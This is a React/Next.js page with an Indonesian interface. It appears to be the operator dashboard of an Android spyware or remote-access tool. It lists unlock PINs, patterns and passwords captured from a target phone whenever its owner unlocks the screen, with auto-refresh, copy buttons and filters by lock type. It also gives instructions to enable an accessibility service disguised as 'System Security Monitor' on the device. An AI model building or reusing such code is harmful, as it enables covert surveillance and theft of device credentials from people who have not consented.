'use client'

import { useState, useEffect, useCallback, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'

interface PinCapture {
  id: number
  lockType: string
  value: string
  capturedAt: string
}

const TYPE_LABEL: Record<string, { label: string; color: string; icon: string }> = {
  pin:      { label: 'PIN',    color: 'text-yellow-400 bg-yellow-400/10 border-yellow-400/30', icon: '🔢' },
  pattern:  { label: 'Pola',   color: 'text-purple-400 bg-purple-400/10 border-purple-400/30', icon: '⬡' },
  password: { label: 'Sandi',  color: 'text-blue-400   bg-blue-400/10   border-blue-400/30',   icon: '🔤' },
  unknown:  { label: 'Lainnya',color: 'text-gray-400   bg-gray-400/10   border-gray-400/30',   icon: '❓' },
}

function PinLogContent() {
  const params   = useSearchParams()
  const deviceId = params.get('deviceId') ?? ''

  const [captures,    setCaptures]    = useState<PinCapture[]>([])
  const [loading,     setLoading]     = useState(false)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [copied,      setCopied]      = useState<number | null>(null)
  const [filter,      setFilter]      = useState<string>('all')

  const fetchCaptures = useCallback(async () => {
    if (!deviceId) return
    setLoading(true)
    try {
      const res  = await fetch(`/api/device/pinlog?deviceId=${deviceId}&limit=200`)
      const data = await res.json()
      if (data.captures) setCaptures(data.captures)
    } finally {
      setLoading(false)
    }
  }, [deviceId])

  useEffect(() => { fetchCaptures() }, [fetchCaptures])

  useEffect(() => {
    if (!autoRefresh) return
    const id = setInterval(fetchCaptures, 5000)
    return () => clearInterval(id)
  }, [autoRefresh, fetchCaptures])

  const handleClear = async () => {
    if (!deviceId || !confirm('Hapus semua data PIN/Pola/Sandi?')) return
    await fetch(`/api/device/pinlog?deviceId=${deviceId}`, { method: 'DELETE' })
    setCaptures([])
  }

  const copyValue = (id: number, value: string) => {
    navigator.clipboard.writeText(value)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  const filtered = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)

  const fmt = (iso: string) =>
    new Date(iso).toLocaleString('id-ID', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit',
    })

  if (!deviceId) {
    return (
      <div className="flex items-center justify-center h-full text-gray-400">
        <div className="text-center">
          <div className="text-5xl mb-4">🔒</div>
          <p className="text-lg font-medium">Pilih perangkat terlebih dahulu</p>
          <p className="text-sm mt-1 text-gray-500">Gunakan sidebar untuk memilih perangkat aktif</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex flex-col h-full bg-gray-950 text-white">

      {/* Header */}
      <div className="flex items-center justify-between px-6 py-4 border-b border-gray-800 bg-gray-900">
        <div className="flex items-center gap-3">
          <span className="text-2xl">🔓</span>
          <div>
            <h1 className="text-lg font-bold">PIN / Pola / Sandi</h1>
            <p className="text-xs text-gray-400">
              {captures.length} entri — ditangkap saat layar dibuka
            </p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setAutoRefresh(v => !v)}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${
              autoRefresh
                ? 'bg-green-500/10 border-green-500/30 text-green-400'
                : 'bg-gray-800 border-gray-700 text-gray-400'
            }`}
          >
            {autoRefresh ? '● Auto' : '○ Manual'}
          </button>
          <button
            onClick={fetchCaptures}
            disabled={loading}
            className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs text-gray-300 transition-all disabled:opacity-50"
          >
            {loading ? '⟳' : '↻'} Refresh
          </button>
          <button
            onClick={handleClear}
            className="px-3 py-1.5 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 rounded-lg text-xs text-red-400 transition-all"
          >
            🗑 Hapus Semua
          </button>
        </div>
      </div>

      {/* Filter Tabs */}
      <div className="flex gap-1 px-6 py-3 border-b border-gray-800 bg-gray-900/50">
        {(['all', 'pin', 'pattern', 'password'] as const).map(t => {
          const info  = t === 'all' ? null : TYPE_LABEL[t]
          const count = t === 'all' ? captures.length : captures.filter(c => c.lockType === t).length
          return (
            <button
              key={t}
              onClick={() => setFilter(t)}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${
                filter === t
                  ? 'bg-indigo-500/20 border-indigo-500/40 text-indigo-300'
                  : 'bg-gray-800/60 border-gray-700 text-gray-400 hover:text-gray-200'
              }`}
            >
              {info ? `${info.icon} ${info.label}` : '📋 Semua'} ({count})
            </button>
          )
        })}
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto px-6 py-4">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-48 text-gray-500">
            <div className="text-4xl mb-3">🔒</div>
            <p className="text-base font-medium text-gray-400">Belum ada data</p>
            <p className="text-sm mt-1">
              {filter === 'all'
                ? 'Aktifkan "System Security Monitor" di Pengaturan → Aksesibilitas'
                : `Belum ada tangkapan tipe "${filter}"`}
            </p>
            {filter === 'all' && (
              <div className="mt-4 p-4 bg-gray-800/60 border border-gray-700 rounded-xl text-xs text-gray-400 max-w-sm text-center leading-relaxed">
                📱 Cara aktifkan:<br />
                <span className="text-yellow-400">Pengaturan → Aksesibilitas → System Security Monitor → ON</span>
              </div>
            )}
          </div>
        ) : (
          <div className="space-y-2">
            {filtered.map(c => {
              const info = TYPE_LABEL[c.lockType] ?? TYPE_LABEL['unknown']
              return (
                <div
                  key={c.id}
                  className="flex items-center gap-4 p-4 bg-gray-900 border border-gray-800 hover:border-gray-700 rounded-xl transition-all group"
                >
                  <div className={`shrink-0 px-2.5 py-1 rounded-lg text-xs font-bold border ${info.color}`}>
                    {info.icon} {info.label}
                  </div>

                  <div className="flex-1 min-w-0">
                    <div className="font-mono text-2xl font-bold text-white tracking-widest truncate">
                      {c.value}
                    </div>
                    <div className="text-xs text-gray-500 mt-0.5">{fmt(c.capturedAt)}</div>
                  </div>

                  <button
                    onClick={() => copyValue(c.id, c.value)}
                    className="shrink-0 px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-lg text-xs text-gray-400 hover:text-white transition-all opacity-0 group-hover:opacity-100"
                  >
                    {copied === c.id ? '✓ Disalin' : '⎘ Salin'}
                  </button>
                </div>
              )
            })}
          </div>
        )}
      </div>

      <div className="px-6 py-3 border-t border-gray-800 bg-gray-900/50 text-xs text-gray-500 flex items-center justify-between">
        <span>📡 Data dikirim otomatis saat user berhasil membuka layar</span>
        <span>{filtered.length} dari {captures.length} ditampilkan</span>
      </div>
    </div>
  )
}

export default function PinLogPage() {
  return (
    <Suspense fallback={
      <div className="flex items-center justify-center h-full bg-gray-950">
        <div className="text-gray-400 text-sm">Memuat...</div>
      </div>
    }>
      <PinLogContent />
    </Suspense>
  )
}
